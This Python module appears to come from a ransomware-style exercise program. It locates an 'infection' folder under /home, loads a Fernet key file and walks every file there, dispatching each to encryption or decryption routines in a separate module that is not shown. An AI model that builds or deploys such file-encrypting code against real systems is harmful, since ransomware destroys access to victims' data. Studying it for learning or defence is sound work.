from genericpath import isfile
from os import listdir
from cryptography.fernet import Fernet
from lib import crypt
import lib.messages as msg
import glob, os
from os import path

def files_treat(extensions, crypt, silence, key):
    """
    Unifies the program modes and runs it.
    """
    folder = FolderInfectionExist()
    if key:
        if isfile(key):
            k = ReadAndReturnFernet(key)
        else:
            msg.err_msg("Key must be a file not a string")
            return
    else:
        msg.err_msg("Can't read keyfile.")
        return

    for path, subdirs, files in os.walk(folder):
        for name in files:
            p = path + '/'
            src = p + name
            switch_crypt(extensions, crypt, src, k, silence, p)

def ReadAndReturnFernet(keypath):
    with open(keypath, "rb") as mykey:
        readed = mykey.read()
        k = Fernet(readed)
    return k

def FolderInfectionExist():
    for folder in glob.glob(r'/home/**/infection/', recursive=True):
        if folder:
            return folder
        else:
            return None

def KeyExist():
    for file in glob.glob(r'/home/**/key.key', recursive=True):
        if file:
            return file
        else:
            return None

def check_key(inputkey):
    with open("utils/key.key", "r") as mykey:
            key = mykey.read()
    if not inputkey == key:
        return None
    else:
        return 1

def load_list_ext():
    txt_file = open("lib/ext/extensions.txt", "r")
    content = txt_file.read()
    content_list = content.split('\n')
    txt_file.close()
    return content_list

def switch_crypt(extensions, mode, src, k, silence, folder):
    if mode == False:
        crypt.decrypt_file(src, k, silence, folder)
    else:
        crypt.encrypt_file(extensions, src, k, silence, folder)
